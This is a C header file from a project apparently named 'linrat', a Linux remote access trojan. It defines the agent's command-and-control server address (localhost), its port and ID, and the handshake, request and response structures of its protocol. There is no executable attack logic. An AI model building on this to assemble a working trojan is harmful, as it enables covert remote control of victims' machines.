/*
 * Author   : Vladislav Khudash (18 y.o., Ukraine)
 * Source   : https://github.com/vk-candpython/linrat/blob/main/agent.h
 * Compiler : GCC (GNU)
 * Platform : Linux (x86_64)
 * Summary  : Agent configuration and definitions.
*/


#ifndef LINRAT_AGENT_H
#define LINRAT_AGENT_H


/* https://github.com/vk-candpython/linrat/blob/main/lindef.h
INTERNAL LINUX (x86_64) DECLARATIONS */
#include "lindef.h"


#define LR_SERVER_IPV4 IPv4(127, 0, 0, 1)
#define LR_SERVER_PORT 12701
#define LR_SERVER_ID   0x5372532D524C6B76UL // "vkLR-SrS"


#define LR_NONCE_SIZE 12


typedef UINT64 idsz_t;
typedef UINT32 datasz_t;
typedef UINT16 cmdsz_t;


DEC_STRUCT (session_handshake_t) {
    idsz_t serverID;
    idsz_t sessionID;
    BYTE   nonce[LR_NONCE_SIZE];
    BYTE   pad0[4];
};

DEC_STRUCT (server_request_t) {
    idsz_t   id;
    cmdsz_t  command;
    BYTE     pad0[2];
    datasz_t paramSize;
};

DEC_STRUCT (agent_response_t) {
    idsz_t   id;
    datasz_t dataSize;
    BYTE     pad0[4];
};


#endif /* LINRAT_AGENT_H */
